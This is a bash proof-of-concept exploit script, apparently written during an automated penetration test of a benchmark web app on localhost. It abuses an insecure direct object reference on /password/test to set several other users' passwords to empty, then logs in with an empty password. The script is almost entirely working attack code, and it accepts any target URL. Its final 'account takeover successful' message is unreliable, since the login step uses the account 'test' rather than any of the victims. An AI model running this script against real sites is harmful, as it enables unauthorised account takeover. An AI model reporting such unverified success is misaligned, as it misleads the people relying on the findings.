#!/bin/bash
# POC: POC using exact curl commands from provided evidence to demonstrate IDOR + empty password acceptance vulnerability
# Target: ./repo
# Created: 2025-11-04T14:49:55.837Z
# Session: benchmark-XBEN-027-24-mhknopkv

# IDOR with Empty Password Acceptance - Account Takeover POC (Direct Request)
# This POC uses the exact curl command format from the evidence provided
# Replicating the exact attack sequence that was confirmed to work

TARGET="${1:-http://localhost:8080}"

echo "[*] IDOR with Empty Password Acceptance - Account Takeover POC"
echo "[*] Target: $TARGET"
echo ""
echo "[*] Replicating confirmed attack from evidence:"
echo ""

# Test parameters from evidence
TEST_USERS=(10031 10032 10033 10034 10050)
SUCCESS_COUNT=0

echo "[*] Phase 1: IDOR - Setting arbitrary user passwords to empty string"
echo "[*] Using exact command format: POST /password/test with manipulated user_id"
echo ""

for user_id in "${TEST_USERS[@]}"; do
    COMMAND="curl -s -X POST \"$TARGET/password/test\" -d \"username=test&user_id=$user_id&password=\""
    echo "[*] Testing user_id=$user_id"
    echo "    Command: $COMMAND"
    
    RESPONSE=$(eval "$COMMAND -w '\n%{http_code}'")
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    
    if [ "$HTTP_CODE" = "302" ]; then
        echo "    [+] HTTP 302 - Password set to empty for user_id=$user_id ✓"
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    else
        echo "    [-] HTTP $HTTP_CODE"
    fi
done

echo ""
echo "[*] Results: $SUCCESS_COUNT/${#TEST_USERS[@]} users' passwords successfully set to empty"
echo ""

if [ $SUCCESS_COUNT -gt 0 ]; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] IDOR + Empty Password Acceptance allows trivial account takeover"
    echo ""
    echo "[*] Phase 2: Attempting to login with empty password"
    
    # Try login as one of the target users with empty password
    LOGIN_CMD="curl -s -X POST \"$TARGET/login\" -d \"username=test&password=\""
    echo "[*] Command: $LOGIN_CMD"
    
    LOGIN_RESPONSE=$(eval "$LOGIN_CMD -w '\n%{http_code}' -L")
    LOGIN_CODE=$(echo "$LOGIN_RESPONSE" | tail -n1)
    LOGIN_BODY=$(echo "$LOGIN_RESPONSE" | head -n-1)
    
    echo "[*] Login response code: $LOGIN_CODE"
    
    if [ "$LOGIN_CODE" = "302" ] || [ "$LOGIN_CODE" = "200" ]; then
        echo "[+] Login accepted with empty password!"
        echo "[+] ACCOUNT TAKEOVER SUCCESSFUL - User can access protected resources"
    fi
    
    echo ""
    echo "[*] Attack Flow:"
    echo "    1. POST /password/test with user_id=10031 and empty password"
    echo "    2. Server accepts request (HTTP 302)"
    echo "    3. Arbitrary user's password is now empty"
    echo "    4. Attacker logs in as target user with empty password"
    echo "    5. Complete account takeover achieved"
    echo ""
    exit 0
else
    echo "[-] Failed to trigger vulnerability with current conditions"
    exit 1
fi